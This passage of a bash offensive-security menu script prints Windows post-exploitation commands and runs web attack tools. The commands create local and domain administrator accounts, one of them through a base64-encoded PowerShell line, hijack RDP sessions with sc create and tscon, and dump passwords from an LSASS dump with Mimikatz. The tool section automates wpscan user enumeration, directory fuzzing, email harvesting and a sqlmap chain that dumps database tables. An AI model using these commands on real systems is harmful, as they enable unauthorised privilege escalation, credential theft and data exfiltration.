        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo -e "                       -+= Info =+-"
        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo "Choose one of the following commands: "
        echo -e " "
        echo "[1] Create User and add to local administrator"
        echo -e " "
        echo "[2] Get AD Users Logon History ( Script )"
        echo -e " "
        echo "[3] Connect to a lock user ( TS Session Hijacking )"
        echo -e " "
        echo "[4] Create User on the domain and add to Domain Admins group"
        echo -e " "
        echo "[5] Launch Mimikatz against Lsass.dmp"
        echo -e " "
        echo "[6] Python Bash terminal spawn command"
        echo -e " "
        echo "[7] RDP User Add Command"
        echo -e " "
        echo "[8] RDP Session Hijacking"
        echo -e " " 
        read -p "Enter your choice --> " choice
        echo -e " "
        if [ "$choice" = "1" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "net user <username> <password> /add"
                echo -e " "
                echo -e "net localgroup administrators <username> /add "
                echo -e " "
                echo "--------- OR Run the PowerShell Command --------- "
                echo -e " "
                echo -e "powershell -en \"bgBlAHQAIAB1AHMAZQByACAASQBQAFYALQBQAFQAIABTAG4AaQByAF8ARABhAG4AMgAwADEAOAAhACAALwBBAEQARAA7ACAAbgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAASQBQAFYALQBQAFQAIAAvAEEARABEAA==\""
                echo -e " "
        fi
        if [ "$choice" = "2" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e ".\Get_AD_Users_Logon_History.ps1 -MaxEvent 800 -LastLogonOnly -OuOnly"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "3" ]; then
                echo -e " "
                echo "----------- Run The Following Commands (Endpoint) ----------- "
                echo -e " "
                echo -e " "
                echo -e "psexec -s \ \localhost cmd"
                echo -e " "
                echo -e "query user"
                echo -e " "
                echo -e "tscon <ID> /dest:console"
                echo -e " "
                echo -e " "
                echo "----------- Run The Following Commands (Servers) ----------- "
                echo -e " "
                echo -e " "
                echo -e "query user"
                echo -e " "
                echo -e "sc create sesshijack binpath- \"cmd.exe /k tscon <ID> /dest:rdp-tcp#46\""
                echo -e " "
                echo -e "net start sesshijack"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "4" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "net user <username> <password> /ADD /DOMAIN"
                echo -e " "
                echo -e "net group \"Domain Admins\" <username> /ADD /DOMAIN"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "5" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "sekurlsa::minidump lsass.dmp"
                echo -e " "
                echo -e "sekurlsa::logonPasswords full"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "6" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "python -c 'import pty; pty.spawn("/bin/bash")'"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "7" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "NET LOCALGROUP "Remote Desktop Users" domainname\username /ADD"
                echo -e " "
                echo -e " "
        fi
        if [ "$choice" = "8" ]; then
                echo -e " "
                echo "----------- Run The Following Commands ----------- "
                echo -e " "
                echo -e " "
                echo -e "query user"
                echo -e " "
                echo -e " "
                echo -e "sc create [something] binpath="cmd.exe /k [id] tscon /dest:rdp-tcp#[session]""
                echo -e " "
                echo -e " " 
                echo -e "net start [something]"
                
        fi
                
                
        if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4" -a "$choice" != "5" -a "$choice" != "6" -a "$choice" != "7" -a "$choice" != "8" ]; then
                choice=1000
        fi
fi

if [ "$choice" = "4" ]; then
        banner
        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo -e "                       -+= Web Application Attacks =+-"
        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo "Choose one of the following commands: "
        echo -e " "
        echo "[1] Web Application Scanners "
        echo -e " "
        echo "[2] Email Harvesting " 
        echo -e " "
        echo "[3] SQL Map "
        echo -e " "
        echo "[4] Sublister (Subdomain Scanner)"
        echo -e " "
        echo "[5] Coming Soon "
        echo -e " "
        echo "[6] Coming Soon"
        echo -e " "
        echo "[7] Coming Soon"
        echo -e " "
        echo "[8] Coming Soon"
        echo -e " " 
        read -p "Enter your choice --> " choice
        echo -e " "
		clear
        if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4"  ]; then
        choice=1000
        fi
	
									
		if [ "$choice" = "1" ]; then
				echo -e $OKORANGE"________________________________________________________________ $RESET"
				echo -e " "
				echo -e "                      -+= Web Application Scanners =+-"
				echo -e $OKORANGE"________________________________________________________________ $RESET"
				echo -e " "
				echo -e " [1] wFuzz - Directory Scanner " 
				echo -e " " 
				echo -e " [2] WpScan - Word Press Scanner " 
				echo -e " " 
				echo -e " [3] Dirb - Scan Directories Under Proxy " 
				echo -e " " 
				echo -e " [4] Nikto - Scan Vulnerabilites  " 
				echo -e " "
				echo -e " [5] Gobuster - Scan Directories Under Code Based Webs  " 
				echo -e " "
				read -p "Enter your choice --> " choice
				echo -e " "
				clear
				if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4" -a "$choice" != "5" ]; then
					  choice=1000
				fi
	
									if [ "$choice" = "1" ]; then
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e "                                   -+= Wfuzz =+-"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										read -p " Enter The Website URL: " url
										echo -e " " 
										echo -e " Ok , We Are Ready To Fuzz ! " 
										echo -e " " 
										command wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --sc 200,302 $url/FUZZ 
										echo -e " " 
									fi
									if [ "$choice" = "2" ]; then
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e "                                -+= Word Press =+-"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e " [1] Simple Scanning " 
										echo -e " " 
										echo -e " [2] User Enumeration " 
										echo -e " " 
										echo -e " [3] Deep Plugin Scanning " 
										echo -e " " 
										read -p "Enter your choice --> " choice1
										echo -e " " 
									
																	if [ "$choice1" = "1" ]; then
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e "                      -+= Word Press Simple Scanning =+-"
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e " "
																		echo -e " Simple Scanning Is Starting" 
																		echo -e " "
																		read -p "Enter URL: " url
																		echo -e " " 
																		command wpscan --url $url
																	fi
																	if [ "$choice1" = "2" ]; then
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e "                      -+= Word Press User Enumeration =+-"
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e " "
																		echo -e " User Enumeration Is Starting" 
																		echo -e " "
																		read -p "Enter URL: " url
																		echo -e " " 
																		command wpscan --url $url --enumerate u 
																	fi
																	if [ "$choice1" = "3" ]; then
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e "                      -+= Word Press Deep Plugin Scanning =+-"
																		echo -e $OKORANGE"________________________________________________________________ $RESET"
																		echo -e " "
																		echo -e " "
																		echo -e " Deep Plugin Scan Is Starting" 
																		echo -e " "
																		read -p "Enter URL: " url
																		echo -e " " 
																		command wpscan --url $url --plugins-detection aggressive
																	fi
											
									fi
									if [ "$choice" = "3" ]; then
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e "                              -+= Dirb =+-"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e " "
										read -p " Enter The Website URL: " url
										echo -e " " 
										read -p " Enter The proxy Port: " port
										echo -e " " 
										echo -e " Ok , We Are Ready To Scan! " 
										echo -e " " 
										command dirb $url -p $url:$port 
										echo -e " " 
									fi
									
									if [ "$choice" = "4" ]; then
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e "                               -+= Nikto =+-"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e " "
										read -p " Enter The Website URL: " url
										echo -e " " 
										echo -e " Ok , We Are Ready To Scan! " 
										echo -e " " 
										command nikto -h $url
										echo -e " " 
									fi
									
									if [ "$choice" = "5" ]; then
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e "                              -+= Gobuster =+-"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e " "
										echo -e " "
										read -p " Enter The Website URL: " url
										echo -e " " 
										echo -e " "
										read -p " Enter The Website Code Based ( PHP , ASPX , etc ): " base
										echo -e " " 
										echo -e " Ok , We Are Ready To Scan! " 
										echo -e " " 
										command gobuster dir -u $url -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x $base
										echo -e " " 
									fi
				fi
				
				if [ "$choice" = "2" ]; then
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e "                        -+= Email Harvesting =+-"
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e " " 
						read -p " Enter The Website You Wish To Email Harvest From: " url
						echo -e " " 
						command theHarvester -d $url -b google 
				fi
				
				if [ "$choice" = "3" ]; then
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e "                        -+= SQL Map =+-"
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e " " 
						echo " [1] Sql Map Under File "
						echo -e " " 
						echo " [2] None " 
						echo -e " "
						read -p " Enter Your Choice: " choice
						
											if [ "$choice" = "1" ]; then
																echo -e $OKORANGE"________________________________________________________________ $RESET"
																echo -e " "
																echo -e "                        -+= Sql Map Under File =+-"
																echo -e $OKORANGE"________________________________________________________________ $RESET"
																echo -e " "
																echo -e " "
																read -p " Enter File's Path You Wish To Sql Inject: " path
																echo -e " " 
																echo -e " "
																command sqlmap -r $path --dbs
																read -p " Select DataBase ( Write AS IS ) " db
																command sqlmap -r $path -D $db --tables
																read -p " Select Table ( Write AS IS ) " table
																command sqlmap -r $path -D $db -T $table --column
																sleep 5
																echo -e " Dumping Table : " 
																command sqlmap -r $path -D $db -T $table --dump
																echo -e " We Have Successfully Injected ! "
																echo -e " " 
											fi
											
											if [ "$choice" = "2" ]; then
											echo -e " none" 
											fi

					
						
				fi
				if [ "$choice" = "4" ]; then
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e "                        -+= Sublister =+-"
						echo -e $OKORANGE"________________________________________________________________ $RESET"
						echo -e " "
						echo -e " " 
						read -p " Enter The Domain You Want To Scan: " domain
						echo -e " " 
						command python3 /root/Documents/Sublist3r/sublist3r.py -b -vv -d $domain 
						echo -e " "
				fi
			
			
			
			
		if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4" -a "$choice" != "5" ]; then
        choice=1000
        fi
fi

if [ "$choice" = "1000" ]; then
        clear
        banner
        echo -e $OKORANGE"________________________________________________________________"
        echo -e " "
        echo "Next time read the instructions !!!!"
        echo -e " "
        echo "Bye Bye !!!"
        echo -e " "
fi
